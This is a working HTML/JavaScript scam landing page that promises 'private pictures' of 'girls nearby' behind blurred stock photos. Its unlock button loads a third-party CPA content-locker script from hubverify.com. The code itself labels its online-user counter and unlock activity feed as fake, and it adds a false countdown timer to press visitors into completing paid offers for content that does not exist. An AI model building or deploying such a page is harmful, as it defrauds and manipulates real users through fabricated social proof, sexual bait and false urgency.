<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Unlock Private Pictures</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    .blurred { filter: blur(12px); transition: 0.3s ease-in-out; }
    .profile:hover .blurred { filter: blur(6px); }
    .modal { display: none; }
    .modal.active { display: flex; animation: fadeIn 0.4s ease-in-out; }
    .modal-box { animation: zoomIn 0.4s ease-in-out; }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    @keyframes zoomIn {
      from { transform: scale(0.7); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    .pulse { animation: pulse 1.5s infinite; }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-top: 4px solid #ec4899;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body class="bg-gray-900 text-white flex items-center justify-center min-h-screen">
  <div class="max-w-6xl w-full p-4">
    <h1 class="text-3xl font-bold text-center mb-6">🔥 Girls Nearby Waiting For You 🔥</h1>

    <!-- Profile Grid -->
    <div id="profileGrid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4"></div>

    <p class="text-center text-gray-400 mt-6 text-sm">
      ⚠️ You must verify your age (18+) to view these private pictures.
    </p>
  </div>

  <!-- Modal -->
  <div id="lockerModal" class="modal fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center z-50">
    <div class="modal-box bg-gray-800 rounded-2xl p-6 max-w-lg w-full relative shadow-lg">
      <button onclick="closeModal()" class="absolute top-2 right-2 text-gray-400 hover:text-white text-xl">&times;</button>
      <h2 class="text-lg font-bold text-center mb-4">🔒 Verify to Unlock</h2>

      <!-- Countdown -->
      <div id="countdown" class="text-center text-pink-400 font-bold mb-3 text-sm">
        Offer expires in <span id="timer">02:00</span> ⏳
      </div>

      <!-- Locker Area -->
      <div id="lockerContainer" class="text-center"></div>

      <!-- Fake Live Counter -->
      <div id="liveCounter" class="mt-4 text-center text-sm text-gray-300">
        👥 <span id="onlineUsers">37</span> users online now <br>
        ✅ <span id="unlockedUsers">12</span> just unlocked private pics
      </div>

      <!-- Recent Activity Feed -->
      <div id="activityFeed" class="mt-4 bg-gray-700 rounded-lg p-3 h-32 overflow-hidden text-xs text-gray-200 space-y-2"></div>
    </div>
  </div>

  <script>
    // Profile Images Array
    const profiles = [
      "https://randomuser.me/api/portraits/women/65.jpg",
      "https://randomuser.me/api/portraits/women/32.jpg",
      "https://randomuser.me/api/portraits/women/44.jpg",
      "https://randomuser.me/api/portraits/women/18.jpg",
      "https://randomuser.me/api/portraits/women/50.jpg",
      "https://randomuser.me/api/portraits/women/12.jpg",
      "https://randomuser.me/api/portraits/women/25.jpg",
      "https://randomuser.me/api/portraits/women/39.jpg"
    ];

    // Render Profiles
    const grid = document.getElementById("profileGrid");
    profiles.forEach(src => {
      const div = document.createElement("div");
      div.className = "profile relative";
      div.innerHTML = `
        <img src="${src}" class="w-full h-56 object-cover rounded-xl blurred">
        <div class="absolute inset-0 flex items-center justify-center">
          <button onclick="openModal()" class="bg-pink-600 px-4 py-2 rounded-lg text-sm font-semibold pulse shadow-lg">Unlock</button>
        </div>
      `;
      grid.appendChild(div);
    });

    // Modal Functions
    function openModal() {
      document.getElementById("lockerModal").classList.add("active");
      const container = document.getElementById("lockerContainer");
      container.innerHTML = `
        <div id="loadingBox">
          <div class="spinner"></div>
          <p class="mt-3 text-sm text-gray-300">Loading verification system...</p>
        </div>
      `;

      // Remove old locker script if exists
      let oldScript = document.getElementById("afmlock");
      if (oldScript) oldScript.remove();

      // Load CPA Locker Script
      setTimeout(() => {
        container.innerHTML = "";
        let s = document.createElement("script");
        s.src = "https://hubverify.com/cl/clocker.php?id=68bb9ae35b16c"; 
        s.id = "afmlock";
        document.body.appendChild(s);
      }, 3000);

      // Start countdown timer (2 min)
      startCountdown(120);
    }
    function closeModal() {
      document.getElementById("lockerModal").classList.remove("active");
    }

    // Countdown Timer
    function startCountdown(duration) {
      let timer = duration, minutes, seconds;
      const display = document.getElementById("timer");
      const interval = setInterval(() => {
        minutes = String(Math.floor(timer / 60)).padStart(2, "0");
        seconds = String(timer % 60).padStart(2, "0");
        display.textContent = minutes + ":" + seconds;
        if (--timer < 0) {
          clearInterval(interval);
          display.textContent = "00:00";
        }
      }, 1000);
    }

    // Fake Live Counter
    let online = 37, unlocked = 12;
    setInterval(() => {
      online += (Math.random() > 0.5 ? 1 : -1);
      if (online < 20) online = 20;
      document.getElementById("onlineUsers").textContent = online;
      if (Math.random() > 0.7) {
        unlocked++;
        document.getElementById("unlockedUsers").textContent = unlocked;
      }
    }, 4000);

    // Fake Recent Activity
    const users = [
      {name: "Alex", img: "https://randomuser.me/api/portraits/men/11.jpg", flag: "🇺🇸"},
      {name: "Sophia", img: "https://randomuser.me/api/portraits/women/14.jpg", flag: "🇬🇧"},
      {name: "Emma", img: "https://randomuser.me/api/portraits/women/22.jpg", flag: "🇨🇦"},
      {name: "Liam", img: "https://randomuser.me/api/portraits/men/19.jpg", flag: "🇦🇺"},
      {name: "Olivia", img: "https://randomuser.me/api/portraits/women/30.jpg", flag: "🇳🇿"},
      {name: "Noah", img: "https://randomuser.me/api/portraits/men/28.jpg", flag: "🇩🇪"},
      {name: "Mia", img: "https://randomuser.me/api/portraits/women/36.jpg", flag: "🇫🇷"},
      {name: "James", img: "https://randomuser.me/api/portraits/men/44.jpg", flag: "🇮🇹"}
    ];

    function addActivity() {
      const user = users[Math.floor(Math.random() * users.length)];
      const minutes = Math.floor(Math.random() * 5) + 1;
      const feed = document.getElementById("activityFeed");
      const div = document.createElement("div");
      div.className = "flex items-center space-x-2";
      div.innerHTML = `
        <img src="${user.img}" class="w-6 h-6 rounded-full">
        <span>${user.flag} User_${user.name} unlocked 18+ pics ${minutes} mins ago</span>
      `;
      feed.prepend(div);
      if (feed.children.length > 6) feed.removeChild(feed.lastChild);
    }
    setInterval(addActivity, 5000);
  </script>
</body>
</html>
